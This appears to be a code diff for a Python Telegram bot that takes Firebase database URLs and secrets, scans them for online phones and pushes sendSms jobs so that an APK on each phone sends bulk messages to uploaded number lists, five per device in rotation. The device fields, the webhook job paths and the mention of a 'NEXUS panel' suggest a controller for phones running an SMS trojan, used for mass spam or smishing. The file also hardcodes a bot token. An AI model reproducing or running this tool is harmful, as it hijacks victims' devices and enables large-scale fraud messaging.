@@ -1,17 +1,10 @@
 #!/usr/bin/env python3
 """
 spinach Multi-User Automatic SMS Bot
-Firebase input: URL list only (txt). Optional database secret per line.
-No service-account JSON required — uses Firebase REST API (same as NEXUS panel).
-
-Flow:
-  1. User uploads .txt with Firebase RTDB URLs (one per line)
-     Optional format: URL|SECRET   or   URL SECRET
-  2. Bot scans every project → finds online devices
-  3. User uploads recipient numbers (.txt)
-  4. User sends custom SMS text
-  5. Bot distributes: max 5 SMS per online device, then switch
-  6. Live progress bar → auto-stop when all recipients done
+- Reply keyboard menu: Add Firebase / Recipients / Custom SMS / Start / Stop / How to use
+- Per-user persistence (SQLite): firebase URLs, recipients, custom SMS
+- Distribution: 5 SMS from device A, then switch to device B for next 5, etc.
+- Firebase input: URL list (txt). Optional URL|SECRET
 """
 
 import os
@@ -19,6 +12,7 @@ import re
 import json
 import time
 import uuid
+import sqlite3
 import threading
 import logging
 from typing import Any, Optional
@@ -34,11 +28,13 @@ import requests
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8763280422:AAFwSQvwIgSrgqBsGJTZmjGFe0kKlvHVD_o")
 ALLOWED_USERS: set[int] = set()  # empty = everyone
 SMS_PER_DEVICE = 5
-# Match 2.py: 15 min freshness window for lastSeen / heartbeat
 ONLINE_WINDOW_MS = 15 * 60 * 1000
-JOB_DELAY_SEC = 3.5   # give APK time to pick fixed-slot job before next overwrite
+JOB_DELAY_SEC = 3.5
+SAME_DEVICE_EXTRA_DELAY = 2.0
 PROGRESS_EDIT_EVERY = 2
 HTTP_TIMEOUT = 25
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DB_FILE = os.path.join(BASE_DIR, "bot_data.db")
 
 # ── LOGGING ───────────────────────────────────────────────────────────────
 logging.basicConfig(
@@ -49,21 +45,102 @@ log = logging.getLogger("multi-sms-bot")
 
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
 
-# ── SESSION STATE ─────────────────────────────────────────────────────────
+# ── KEYBOARD LABELS ───────────────────────────────────────────────────────
+BTN_ADD_FB = "🔥 Add Firebase"
+BTN_RECIPIENTS = "👥 Recipient Numbers"
+BTN_SMS = "💬 Custom SMS"
+BTN_START = "▶️ Start SMS"
+BTN_STOP = "⏹ Stop SMS"
+BTN_STATUS = "📊 Status"
+BTN_HELP = "❓ How to use"
+BTN_CLEAR = "🗑 Clear Saved"
+BTN_USEALL = "📱 Use All Devices"
+BTN_RESCAN = "🔄 Rescan Devices"
+
+MENU_BUTTONS = {
+    BTN_ADD_FB, BTN_RECIPIENTS, BTN_SMS, BTN_START, BTN_STOP,
+    BTN_STATUS, BTN_HELP, BTN_CLEAR, BTN_USEALL, BTN_RESCAN,
+}
+
+def main_keyboard() -> types.ReplyKeyboardMarkup:
+    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    kb.add(types.KeyboardButton(BTN_ADD_FB), types.KeyboardButton(BTN_RECIPIENTS))
+    kb.add(types.KeyboardButton(BTN_SMS), types.KeyboardButton(BTN_STATUS))
+    kb.add(types.KeyboardButton(BTN_START), types.KeyboardButton(BTN_STOP))
+    kb.add(types.KeyboardButton(BTN_USEALL), types.KeyboardButton(BTN_RESCAN))
+    kb.add(types.KeyboardButton(BTN_HELP), types.KeyboardButton(BTN_CLEAR))
+    return kb
+
+# ── SQLITE PERSISTENCE (multi-user) ───────────────────────────────────────
+def init_db():
+    conn = sqlite3.connect(DB_FILE)
+    cur = conn.cursor()
+    cur.execute("""
+        CREATE TABLE IF NOT EXISTS users (
+            user_id     TEXT PRIMARY KEY,
+            data        TEXT NOT NULL,
+            updated_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    """)
+    cur.execute("PRAGMA journal_mode=WAL")
+    conn.commit()
+    conn.close()
+
+def _default_user_data() -> dict:
+    return {
+        "firebase_urls": [],   # list of {"url": str, "secret": str}
+        "numbers": [],
+        "message": "",
+        "use_all_devices": False,
+    }
+
+def load_user_data(user_id: int) -> dict:
+    uid = str(user_id)
+    try:
+        conn = sqlite3.connect(DB_FILE, timeout=10)
+        cur = conn.cursor()
+        cur.execute("SELECT data FROM users WHERE user_id=?", (uid,))
+        row = cur.fetchone()
+        conn.close()
+        if row:
+            d = json.loads(row[0])
+            base = _default_user_data()
+            base.update(d)
+            return base
+    except Exception as e:
+        log.warning("load_user_data: %s", e)
+    return _default_user_data()
+
+def save_user_data(user_id: int, data: dict):
+    uid = str(user_id)
+    try:
+        conn = sqlite3.connect(DB_FILE, timeout=10)
+        cur = conn.cursor()
+        cur.execute(
+            "INSERT OR REPLACE INTO users (user_id, data, updated_at) VALUES (?, ?, CURRENT_TIMESTAMP)",
+            (uid, json.dumps(data, ensure_ascii=False)),
+        )
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        log.error("save_user_data: %s", e)
+
+# ── SESSION (runtime, per chat) ───────────────────────────────────────────
 @dataclass
 class FirebaseProject:
     name: str
     db_url: str
-    secret: str = ""  # database secret (optional; empty = open rules)
-    devices: list[dict] = field(default_factory=list)
+    secret: str = ""
+    devices: list = field(default_factory=list)
 
 @dataclass
 class Session:
     chat_id: int
-    step: str = "idle"  # idle | await_firebase | await_numbers | await_message | running | done
-    projects: list[FirebaseProject] = field(default_factory=list)
-    online_devices: list[dict] = field(default_factory=list)
-    numbers: list[str] = field(default_factory=list)
+    user_id: int = 0
+    step: str = "idle"  # idle | await_firebase | await_numbers | await_message | running
+    projects: list = field(default_factory=list)
+    online_devices: list = field(default_factory=list)  # ordered list used for batching
+    numbers: list = field(default_factory=list)
     message: str = ""
     sent: int = 0
     failed: int = 0
@@ -75,25 +152,21 @@ class Session:
 sessions: dict[int, Session] = {}
 sessions_lock = threading.Lock()
 
-def get_session(chat_id: int) -> Session:
+def get_session(chat_id: int, user_id: int = 0) -> Session:
     with sessions_lock:
         if chat_id not in sessions:
-            sessions[chat_id] = Session(chat_id=chat_id)
-        return sessions[chat_id]
-
-def reset_session(chat_id: int):
-    with sessions_lock:
-        old = sessions.get(chat_id)
-        if old:
-            old.cancel = True
-        sessions[chat_id] = Session(chat_id=chat_id)
+            sessions[chat_id] = Session(chat_id=chat_id, user_id=user_id or chat_id)
+        s = sessions[chat_id]
+        if user_id:
+            s.user_id = user_id
+        return s
 
 def is_allowed(uid: int) -> bool:
     if not ALLOWED_USERS:
         return True
     return uid in ALLOWED_USERS
 
-# ── FIREBASE REST (URL + optional database secret) ────────────────────────
+# ── FIREBASE REST ─────────────────────────────────────────────────────────
 def norm_url(raw: str) -> str:
     u = (raw or "").strip()
     if not u:
@@ -103,9 +176,6 @@ def norm_url(raw: str) -> str:
     return u.rstrip("/")
 
 def fb_url(base: str, path: str = "", secret: str = "") -> str:
-    """Build REST endpoint: {base}/{path}.json?auth=SECRET
-    Path may already end with .json (2.py style) — do not double it.
-    """
     base = norm_url(base)
     path = (path or "").strip().strip("/")
     if path:
@@ -119,23 +189,19 @@ def fb_url(base: str, path: str = "", secret: str = "") -> str:
         ep += f"?auth={quote(secret, safe='')}"
     return ep
 
-def fb_get(base: str, path: str = "", secret: str = "", shallow: bool = False) -> Any:
+def fb_get(base: str, path: str = "", secret: str = "") -> Any:
     url = fb_url(base, path, secret)
-    if shallow:
-        url += ("&" if "?" in url else "?") + "shallow=true"
     r = requests.get(url, timeout=HTTP_TIMEOUT)
     if r.status_code in (401, 403):
         raise RuntimeError(
-            f"Auth failed ({r.status_code}). "
-            "Add database secret after URL: URL|SECRET  "
-            "(Firebase Console → Project settings → Service accounts → Database secrets)"
+            f"Auth failed ({r.status_code}). Use URL|DATABASE_SECRET"
         )
     if r.status_code == 404:
         raise RuntimeError(f"Not found (404): {base}")
     if r.status_code == 423:
         raise RuntimeError("DB locked (423). Project suspended or over quota.")
     if r.status_code == 429:
-        raise RuntimeError("Rate limited (429). Wait and retry.")
+        raise RuntimeError("Rate limited (429).")
     if not r.ok:
         raise RuntimeError(f"HTTP {r.status_code}: {r.text[:200]}")
     if not r.text or r.text == "null":
@@ -150,15 +216,7 @@ def fb_put(base: str, path: str, data: dict, secret: str = "") -> None:
     if not r.ok:
         raise RuntimeError(f"Write HTTP {r.status_code}: {r.text[:200]}")
 
-def fb_patch(base: str, path: str, data: dict, secret: str = "") -> None:
-    url = fb_url(base, path, secret)
-    r = requests.patch(url, json=data, timeout=HTTP_TIMEOUT)
-    if r.status_code in (401, 403):
-        raise RuntimeError(f"Auth failed ({r.status_code}) on patch")
-    if not r.ok:
-        raise RuntimeError(f"Patch HTTP {r.status_code}: {r.text[:200]}")
-
-# ── ONLINE DETECTION (mirrors NEXUS panel) ────────────────────────────────
+# ── ONLINE / SCAN ─────────────────────────────────────────────────────────
 def parse_timestamp(val) -> Optional[int]:
     if val is None:
         return None
@@ -175,35 +233,19 @@ def parse_timestamp(val) -> Optional[int]:
                 if t < 1_000_000_000_000:
                     t *= 1000
                 return t
-            from datetime import datetime
-            for fmt in ("%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ", "%Y-%m-%d %H:%M:%S"):
-                try:
-                    return int(datetime.strptime(s[:26], fmt).timestamp() * 1000)
-                except Exception:
-                    pass
     except Exception:
         pass
     return None
 
-def is_device_online(node: dict) -> tuple[bool, Optional[int]]:
-    """
-    Broad online detection aligned with 2.py + NEXUS:
-    - isOnline / online / connected truthy
-    - status: True | 1 | "online" | "active" | "alive" | "on" | "connected"
-    - lastOnlineAt / lastSeen / updatedAt / timestamp within ONLINE_WINDOW_MS (15m)
-    - heartbeat dict or scalar timestamp
-    Also walks nested info/status objects used by some APKs.
-    """
+def is_device_online(node: dict) -> tuple:
     if not isinstance(node, dict):
         return False, None
-
     now_ms = int(time.time() * 1000)
     info = node.get("info") if isinstance(node.get("info"), dict) else {}
     st_obj = node.get("status") if isinstance(node.get("status"), dict) else {}
     if not st_obj and isinstance(info.get("status"), dict):
         st_obj = info["status"]
 
-    # Collect best last-seen style timestamp for reporting + freshness
     ts_keys = (
         "lastOnlineAt", "last_seen", "lastSeen", "lastSeenAt",
         "lastOnline", "last_online", "lastActive", "last_active",
@@ -220,7 +262,6 @@ def is_device_online(node: dict) -> tuple[bool, Optional[int]]:
             if t is not None and (last_seen is None or t > last_seen):
                 last_seen = t
 
-    # heartbeat nested
     hb = node.get("heartbeat")
     if isinstance(hb, dict):
         for k in ("timestamp", "ts", "time", "lastSeen", "updatedAt"):
@@ -232,14 +273,12 @@ def is_device_online(node: dict) -> tuple[bool, Optional[int]]:
         if t is not None and (last_seen is None or t > last_seen):
             last_seen = t
 
-    # ── boolean / flag fields (2.py style: truthy, not only `is True`) ──
     for src in (node, info, st_obj):
         if not isinstance(src, dict):
             continue
         if src.get("isOnline") or src.get("online") or src.get("connected") or src.get("alive"):
             return True, last_seen
 
-    # ── status field ──
     raw = None
     if not isinstance(node.get("status"), dict):
         raw = node.get("status")
@@ -256,7 +295,6 @@ def is_device_online(node: dict) -> tuple[bool, Optional[int]]:
         sl = raw.lower().strip()
         if sl in ("online", "active", "alive", "on", "true", "1", "connected"):
             return True, last_seen
-        # non-empty string that is not an explicit offline word → treat online (NEXUS)
         if sl and sl not in ("false", "0", "no", "offline", "inactive", "disconnected", "dead", "gone"):
             return True, last_seen
     if isinstance(raw, (int, float)) and raw != 0:
@@ -265,30 +303,24 @@ def is_device_online(node: dict) -> tuple[bool, Optional[int]]:
         if raw.get("online") or raw.get("isOnline") or raw.get("connected") or raw.get("active") or raw.get("alive"):
             return True, last_seen
 
-    # ── heartbeat status string ──
     if isinstance(hb, dict):
         hb_st = str(hb.get("status") or "").lower()
         if hb_st in ("alive", "online", "active"):
             return True, last_seen
 
-    # ── timestamp freshness (15 min window, allow small clock skew) ──
     if last_seen is not None:
         delta = now_ms - last_seen
         if -60_000 < delta < ONLINE_WINDOW_MS:
             return True, last_seen
-
     return False, last_seen
 
 def extract_phone(node: dict) -> str:
     info = node.get("info") if isinstance(node.get("info"), dict) else {}
-    candidates = [
-        node.get("mobNo"), info.get("mobNo"),
-        node.get("phone"), node.get("phoneNumber"), node.get("phone_number"),
-        info.get("phone"), info.get("phoneNumber"),
-        node.get("mobile"), node.get("number"), info.get("phoneNumber"),
-        node.get("msisdn"), info.get("msisdn"),
-    ]
-    for c in candidates:
+    for c in (
+        node.get("mobNo"), info.get("mobNo"), node.get("phone"), node.get("phoneNumber"),
+        node.get("phone_number"), info.get("phone"), info.get("phoneNumber"),
+        node.get("mobile"), node.get("number"), node.get("msisdn"), info.get("msisdn"),
+    ):
         if c is None:
             continue
         dig = re.sub(r"[^\d+]", "", str(c))
@@ -305,15 +337,13 @@ def extract_phone(node: dict) -> str:
                         return dig
     return "—"
 
-# ── PROJECT SCAN ──────────────────────────────────────────────────────────
 def project_label(db_url: str) -> str:
     u = norm_url(db_url)
     m = re.search(r"https?://([^.]+)", u, re.I)
     return m.group(1) if m else u[:40]
 
-def _merge_device_maps(*maps: dict) -> dict:
-    """clients wins on conflicts (2.py order: clients first, then devices)."""
-    merged: dict = {}
+def _merge_device_maps(*maps) -> dict:
+    merged = {}
     for blob in maps:
         if not isinstance(blob, dict):
             continue
@@ -331,30 +361,20 @@ def _merge_device_maps(*maps: dict) -> dict:
                 merged[did_s] = data
     return merged
 
-def scan_devices(db_url: str, secret: str = "") -> list[dict]:
-    """
-    Fetch clients/ + devices/ (2.py order) and mark online with broad heuristics.
-    """
+def scan_devices(db_url: str, secret: str = "") -> list:
     out = []
+    clients = devices = None
     try:
-        clients = None
-        devices = None
-        # Prefer clients (working APK path), then devices
         try:
             clients = fb_get(db_url, "clients", secret)
         except Exception as e:
-            log.info("clients path miss %s: %s", db_url, e)
+            log.info("clients miss %s: %s", db_url, e)
         try:
             devices = fb_get(db_url, "devices", secret)
         except Exception as e:
-            log.info("devices path miss %s: %s", db_url, e)
-
-        # If both failed hard, surface the devices error (or clients)
+            log.info("devices miss %s: %s", db_url, e)
         if clients is None and devices is None:
-            # one more try on root devices-only for error message
-            snap = fb_get(db_url, "devices", secret)
-            devices = snap
-
+            devices = fb_get(db_url, "devices", secret)
         merged = _merge_device_maps(
             clients if isinstance(clients, dict) else {},
             devices if isinstance(devices, dict) else {},
@@ -362,42 +382,19 @@ def scan_devices(db_url: str, secret: str = "") -> list[dict]:
         for did, node in merged.items():
             online, last_seen = is_device_online(node)
             phone = extract_phone(node)
-            model = (
-                node.get("deviceModel") or node.get("modelName") or node.get("model")
-                or node.get("phone_model") or node.get("device_name") or node.get("name")
-                or ""
-            )
             out.append({
                 "id": str(did),
                 "online": online,
                 "lastSeen": last_seen,
                 "phone": phone,
-                "model": str(model).strip() if model else "",
-                "source": "clients+devices",
             })
-        log.info(
-            "scan %s → total=%d online=%d",
-            project_label(db_url),
-            len(out),
-            sum(1 for d in out if d["online"]),
-        )
+        log.info("scan %s total=%d online=%d", project_label(db_url), len(out), sum(1 for d in out if d["online"]))
     except Exception as e:
-        log.warning("scan devices failed for %s: %s", db_url, e)
+        log.warning("scan fail %s: %s", db_url, e)
         raise
     return out
 
 def push_sms_job(db_url: str, secret: str, device_id: str, to: str, body: str, chat_id: int) -> str:
-    """
-    Write one SMS job for one recipient.
-
-    Critical for multi-recipient:
-    - Fixed path clients/.../webhookEvent/sendSms is a SINGLE slot.
-      Overwriting it before APK reads isSended causes only last number to send.
-    - Strategy:
-        1) Wait until previous slot is free (isSended true / null / timeout)
-        2) PUT new job on fixed 2.py paths
-        3) Also write unique NEXUS-style queue node (never overwrites)
-    """
     job_id = str(uuid.uuid4())[:12]
     now_ms = int(time.time() * 1000)
     to_n = to.strip()
@@ -433,12 +430,11 @@ def push_sms_job(db_url: str, secret: str, device_id: str, to: str, body: str, c
         "jobId": job_id,
     }
 
-    # Wait for previous fixed-slot job to finish (APK sets isSended=true)
     fixed_paths = [
         f"clients/{device_id}/webhookEvent/sendSms",
         f"devices/{device_id}/webhookEvent/sendSms",
     ]
-    wait_deadline = time.time() + 12.0  # max wait per number
+    wait_deadline = time.time() + 12.0
     while time.time() < wait_deadline:
         busy = False
         for p in fixed_paths:
@@ -448,9 +444,7 @@ def push_sms_job(db_url: str, secret: str, device_id: str, to: str, body: str, c
                 continue
             if not isinstance(cur, dict):
                 continue
-            # slot occupied if isSended is explicitly False
             if cur.get("isSended") is False and cur.get("to"):
-                # same number already there → ok to overwrite
                 if str(cur.get("to")).strip() == to_n:
                     continue
                 busy = True
@@ -459,57 +453,37 @@ def push_sms_job(db_url: str, secret: str, device_id: str, to: str, body: str, c
             break
         time.sleep(0.6)
 
-    # Primary fixed slots (2.py) — one write each after wait
     primary = [
         (f"clients/{device_id}/webhookEvent/sendSms.json", payload_simple),
         (f"devices/{device_id}/webhookEvent/sendSms.json", payload_simple),
         (f"devices/{device_id}/actions/sendSms.json", payload_cmd),
         (f"clients/{device_id}/actions/sendSms.json", payload_cmd),
     ]
-    # Unique queue nodes — never collide across recipients
     unique = [
         (f"devices/{device_id}/sendSms/{job_id}", payload_nexus),
         (f"clients/{device_id}/sendSms/{job_id}", payload_nexus),
-        (f"devices/{device_id}/webhookEvent/sendSmsQueue/{job_id}", payload_simple),
-        (f"clients/{device_id}/webhookEvent/sendSmsQueue/{job_id}", payload_simple),
     ]
 
+    wrote = []
     last_err = None
-    wrote_paths = []
-
     for path, payload in primary:
         try:
             fb_put(db_url, path, payload, secret)
-            wrote_paths.append(path)
-            log.info("SMS job OK via %s → %s", path, to_n)
+            wrote.append(path)
         except Exception as e:
             last_err = e
-            log.warning("path fail %s: %s", path, e)
-
     for path, payload in unique:
         try:
             fb_put(db_url, path, payload, secret)
-            wrote_paths.append(path)
-            log.info("SMS queue OK via %s → %s", path, to_n)
+            wrote.append(path)
         except Exception as e:
             last_err = e
-            log.debug("unique path fail %s: %s", path, e)
-
-    if not wrote_paths:
+    if not wrote:
         raise RuntimeError(f"all send paths failed: {last_err}")
-
     return job_id
 
-# ── PARSE INPUT FILES ─────────────────────────────────────────────────────
-def parse_firebase_urls(text: str) -> list[tuple[str, str]]:
-    """
-    Parse lines into (url, secret).
-    Supported:
-      https://proj-default-rtdb.firebaseio.com
-      https://proj-default-rtdb.firebaseio.com|SECRET
-      https://proj-default-rtdb.firebaseio.com SECRET
-      https://proj-default-rtdb.asia-southeast1.firebasedatabase.app
-    """
+# ── PARSE ─────────────────────────────────────────────────────────────────
+def parse_firebase_urls(text: str) -> list:
     results = []
     seen = set()
     for line in text.splitlines():
@@ -519,23 +493,15 @@ def parse_firebase_urls(text: str) -> list[tuple[str, str]]:
         secret = ""
         url = line
         if "|" in line:
-            parts = line.split("|", 1)
-            url, secret = parts[0].strip(), parts[1].strip()
+            a, b = line.split("|", 1)
+            url, secret = a.strip(), b.strip()
         else:
-            # URL then space then secret (secret rarely has spaces)
             m = re.match(r"^(https?://\S+)\s+(\S+)$", line, re.I)
             if m:
                 url, secret = m.group(1), m.group(2)
-            else:
-                # bare host without scheme
-                m2 = re.match(r"^(\S+\.(?:firebaseio\.com|firebasedatabase\.app)\S*)\s+(\S+)$", line, re.I)
-                if m2:
-                    url, secret = m2.group(1), m2.group(2)
         url = norm_url(url)
-        if not url or "firebase" not in url.lower():
-            # still accept any https URL that looks like RTDB
-            if not re.search(r"firebaseio\.com|firebasedatabase\.app", url, re.I):
-                continue
+        if not re.search(r"firebaseio\.com|firebasedatabase\.app", url, re.I):
+            continue
         key = url.lower()
         if key in seen:
             continue
@@ -543,8 +509,8 @@ def parse_firebase_urls(text: str) -> list[tuple[str, str]]:
         results.append((url, secret))
     return results
 
-def parse_numbers(text: str) -> list[str]:
-    """Keep numbers exactly as provided — do NOT auto-prefix +91."""
+def parse_numbers(text: str) -> list:
+    """Keep numbers exactly as provided — no +91 auto-prefix."""
     nums = []
     seen = set()
     for line in text.splitlines():
@@ -561,10 +527,10 @@ def parse_numbers(text: str) -> list[str]:
     return nums
 
 # ── PROGRESS ──────────────────────────────────────────────────────────────
-def progress_bar(sent: int, total: int, width: int = 20) -> str:
+def progress_bar(done: int, total: int, width: int = 20) -> str:
     if total <= 0:
         return "░" * width
-    filled = min(width, int(width * sent / total))
+    filled = min(width, int(width * done / total))
     return "█" * filled + "░" * (width - filled)
 
 def format_progress(s: Session) -> str:
@@ -575,19 +541,104 @@ def format_progress(s: Session) -> str:
     return (
         f"<b>SMS Campaign — {status}</b>\n\n"
         f"<code>[{bar}]</code> {pct}%\n\n"
-        f"✅ Sent: <b>{s.sent}</b>\n"
+        f"✅ Queued: <b>{s.sent}</b>\n"
         f"❌ Failed: <b>{s.failed}</b>\n"
         f"⏳ Left: <b>{left}</b>\n"
         f"📦 Total: <b>{s.total}</b>\n"
-        f"📱 Online devices: <b>{len(s.online_devices)}</b>\n"
-        f"🔥 Projects: <b>{len(s.projects)}</b>"
+        f"📱 Devices in use: <b>{len(s.online_devices)}</b>\n"
+        f"🔁 Rule: <b>{SMS_PER_DEVICE}</b> SMS / device then switch"
     )
 
-# ── WORKER ────────────────────────────────────────────────────────────────
+# ── BUILD DEVICE LIST + BATCH QUEUE (5 per device, then next) ─────────────
+def build_device_list(s: Session, use_all: bool) -> list:
+    """Stable ordered list of devices for batching."""
+    out = []
+    for pi, p in enumerate(s.projects):
+        for d in p.devices:
+            if use_all or d.get("online"):
+                out.append({
+                    "project_idx": pi,
+                    "id": d["id"],
+                    "phone": d.get("phone") or "—",
+                    "project": p.name,
+                })
+    return out
+
+def build_batch_queue(devices: list, numbers: list) -> list:
+    """
+    Assign numbers in blocks of SMS_PER_DEVICE per device:
+      device0 → numbers[0:5]
+      device1 → numbers[5:10]
+      device2 → numbers[10:15]
+      ...
+    If numbers remain after all devices used once, wrap around devices again.
+    """
+    if not devices or not numbers:
+        return []
+    queue = []  # (device_meta, number)
+    di = 0
+    count_on_device = 0
+    for num in numbers:
+        if count_on_device >= SMS_PER_DEVICE:
+            di = (di + 1) % len(devices)
+            count_on_device = 0
+        queue.append((devices[di], num))
+        count_on_device += 1
+    return queue
+
+# ── SCAN ALL SAVED FIREBASE ───────────────────────────────────────────────
+def scan_all_for_session(s: Session, user_data: dict) -> str:
+    entries = user_data.get("firebase_urls") or []
+    if not entries:
+        return "No Firebase URLs saved. Tap <b>🔥 Add Firebase</b> first."
+
+    projects = []
+    errors = []
+    for item in entries:
+        url = item.get("url") if isinstance(item, dict) else str(item)
+        secret = item.get("secret", "") if isinstance(item, dict) else ""
+        url = norm_url(url)
+        label = project_label(url)
+        try:
+            devices = scan_devices(url, secret)
+        except Exception as e:
+            errors.append(f"• <code>{label}</code>: {e}")
+            continue
+        projects.append(FirebaseProject(name=label, db_url=url, secret=secret, devices=devices))
+
+    s.projects = projects
+    use_all = bool(user_data.get("use_all_devices"))
+    s.online_devices = build_device_list(s, use_all=use_all)
+
+    lines = [f"<b>Scan complete</b> — {len(projects)} project(s)\n"]
+    for p in projects:
+        on = sum(1 for d in p.devices if d.get("online"))
+        sec = "🔐" if p.secret else "🔓"
+        lines.append(f"• {sec} <code>{p.name}</code> — {len(p.devices)} device(s), <b>{on} online</b>")
+    if errors:
+        lines.append("\n<b>Failed</b>")
+        lines.extend(errors[:8])
+    mode = "ALL devices" if use_all else "online only"
+    lines.append(f"\n📱 Send pool ({mode}): <b>{len(s.online_devices)}</b>")
+    if s.online_devices:
+        for d in s.online_devices[:12]:
+            lines.append(f"  └ {d['project']}/{d['id']} ({d['phone']})")
+        if len(s.online_devices) > 12:
+            lines.append(f"  … +{len(s.online_devices)-12} more")
+    else:
+        lines.append(
+            "\n⚠️ No devices in pool.\n"
+            "• Rescan after devices come online\n"
+            "• Or tap <b>📱 Use All Devices</b>"
+        )
+    return "\n".join(lines)
+
+# ── CAMPAIGN WORKER ───────────────────────────────────────────────────────
 def run_campaign(chat_id: int):
     s = get_session(chat_id)
     if not s.online_devices or not s.numbers or not s.message:
-        bot.send_message(chat_id, "Missing devices / numbers / message. Restart with /start")
+        bot.send_message(chat_id, "Missing devices / numbers / message.", reply_markup=main_keyboard())
+        s.step = "idle"
         return
 
     s.step = "running"
@@ -596,51 +647,32 @@ def run_campaign(chat_id: int):
     s.total = len(s.numbers)
     s.cancel = False
 
-    devices = list(s.online_devices)
-    if not devices:
-        bot.send_message(chat_id, "No online devices. Abort.")
-        s.step = "idle"
-        return
-
-    queue: list[tuple[dict, str]] = []
-    device_usage: dict[tuple, int] = defaultdict(int)
-    di = 0
-    for num in s.numbers:
-        tried = 0
-        while tried < len(devices):
-            d = devices[di % len(devices)]
-            key = (d["project_idx"], d["id"])
-            if device_usage[key] < SMS_PER_DEVICE:
-                queue.append((d, num))
-                device_usage[key] += 1
-                di += 1
-                break
-            di += 1
-            tried += 1
-        else:
-            d = devices[di % len(devices)]
-            queue.append((d, num))
-            di += 1
+    queue = build_batch_queue(s.online_devices, s.numbers)
+    # Log batch plan
+    plan = defaultdict(list)
+    for dev, num in queue:
+        plan[(dev["project"], dev["id"], dev.get("phone"))].append(num)
+    log.info("batch plan devices=%d numbers=%d", len(plan), len(queue))
+    for (proj, did, phone), nums in plan.items():
+        log.info("  %s/%s (%s) → %d numbers", proj, did, phone, len(nums))
 
     try:
-        msg = bot.send_message(chat_id, format_progress(s))
+        msg = bot.send_message(chat_id, format_progress(s), reply_markup=main_keyboard())
         s.progress_msg_id = msg.message_id
     except Exception:
         s.progress_msg_id = None
 
-    # Prefer spreading recipients across different devices first (one each),
-    # so fixed-slot overwrite is less likely to drop numbers.
-    # queue already round-robins devices; keep per-device sequential with delay.
-
+    prev_key = None
     for idx, (dev, number) in enumerate(queue):
         if s.cancel:
             break
         proj = s.projects[dev["project_idx"]]
+        key = (dev["project_idx"], dev["id"])
         try:
             jid = push_sms_job(proj.db_url, proj.secret, dev["id"], number, s.message, chat_id)
             with s.lock:
                 s.sent += 1
-            log.info("sent %s via %s/%s job=%s", number, proj.name, dev["id"], jid)
+            log.info("queued %s via %s/%s job=%s", number, proj.name, dev["id"], jid)
         except Exception as e:
             with s.lock:
                 s.failed += 1
@@ -652,12 +684,10 @@ def run_campaign(chat_id: int):
             except Exception:
                 pass
 
-        # Extra pause when next job hits same device (fixed slot)
         time.sleep(JOB_DELAY_SEC)
-        if idx + 1 < len(queue):
-            next_dev = queue[idx + 1][0]
-            if (next_dev["project_idx"], next_dev["id"]) == (dev["project_idx"], dev["id"]):
-                time.sleep(2.0)  # same device again → wait longer for isSended
+        if prev_key == key:
+            time.sleep(SAME_DEVICE_EXTRA_DELAY)
+        prev_key = key
 
     s.step = "done"
     try:
@@ -666,341 +696,338 @@ def run_campaign(chat_id: int):
         bot.send_message(
             chat_id,
             f"<b>Campaign finished</b>\n"
-            f"✅ {s.sent} queued on Firebase · ❌ {s.failed} failed · Total {s.total}\n\n"
-            f"<i>Note: “queued” = job written to Firebase "
-            f"(clients/…/webhookEvent/sendSms + devices/… paths). "
-            f"Phone must be online with APK listening to actually transmit SMS.</i>\n\n"
-            f"Use /start for a new run."
+            f"✅ {s.sent} queued · ❌ {s.failed} failed · Total {s.total}\n"
+            f"Rule: {SMS_PER_DEVICE} SMS per device then switch.\n"
+            f"Use menu to run again.",
+            reply_markup=main_keyboard(),
         )
     except Exception:
         pass
+    s.step = "idle"
 
 # ── HANDLERS ──────────────────────────────────────────────────────────────
-@bot.message_handler(commands=["start", "help"])
+HELP_TEXT = (
+    "<b>How to use this bot</b>\n\n"
+    "Multi-user: each Telegram account has its own saved Firebase list, "
+    "recipients, and custom SMS.\n\n"
+    f"1️⃣ <b>{BTN_ADD_FB}</b>\n"
+    "   Send a .txt (or paste) with Firebase RTDB URLs, one per line.\n"
+    "   Optional secret: <code>URL|DATABASE_SECRET</code>\n"
+    "   Saved automatically. Bot scans clients/ + devices/.\n\n"
+    f"2️⃣ <b>{BTN_RECIPIENTS}</b>\n"
+    "   Send .txt or paste numbers (as-is, no +91 added). Saved.\n\n"
+    f"3️⃣ <b>{BTN_SMS}</b>\n"
+    "   Send the exact SMS text. Saved.\n\n"
+    f"4️⃣ <b>{BTN_START}</b>\n"
+    f"   Sends SMS: first {SMS_PER_DEVICE} recipients from device #1, "
+    f"next {SMS_PER_DEVICE} from device #2, and so on.\n\n"
+    f"5️⃣ <b>{BTN_STOP}</b> — cancel running campaign\n"
+    f"6️⃣ <b>{BTN_STATUS}</b> — saved data + progress\n"
+    f"7️⃣ <b>{BTN_USEALL}</b> — include offline device nodes in pool\n"
+    f"8️⃣ <b>{BTN_RESCAN}</b> — rescan Firebase for online devices\n"
+    f"9️⃣ <b>{BTN_CLEAR}</b> — wipe your saved data\n"
+)
+
+@bot.message_handler(commands=["start", "help", "menu"])
 def cmd_start(message: types.Message):
     if not is_allowed(message.from_user.id):
         bot.reply_to(message, "Access denied.")
         return
-    reset_session(message.chat.id)
-    s = get_session(message.chat.id)
-    s.step = "await_firebase"
-    text = (
-        "<b>Multi-User Auto SMS Bot</b>\n\n"
-        "Firebase input = <b>URLs only</b> (no service-account JSON).\n\n"
-        "1️⃣ Upload .txt with Firebase RTDB URLs (one per line)\n"
-        "2️⃣ Bot scans all → lists <b>online</b> devices\n"
-        "3️⃣ Upload recipient numbers .txt\n"
-        "4️⃣ Send custom SMS text\n"
-        "5️⃣ Bot sends <b>5 SMS per online device</b>, then switches\n"
-        "6️⃣ Live progress → stops when done\n\n"
-        "<b>Step 1 — send Firebase URL list now</b>\n"
-        "Example lines:\n"
-        "<code>https://myproj-default-rtdb.firebaseio.com</code>\n"
-        "<code>https://myproj-default-rtdb.firebaseio.com|DATABASE_SECRET</code>\n"
-        "<code>https://myproj-default-rtdb.asia-southeast1.firebasedatabase.app SECRET</code>\n\n"
-        "If rules are locked, append Database Secret after URL "
-        "(Console → Project settings → Service accounts → Database secrets).\n\n"
-        "Commands: /cancel · /status · /start"
-    )
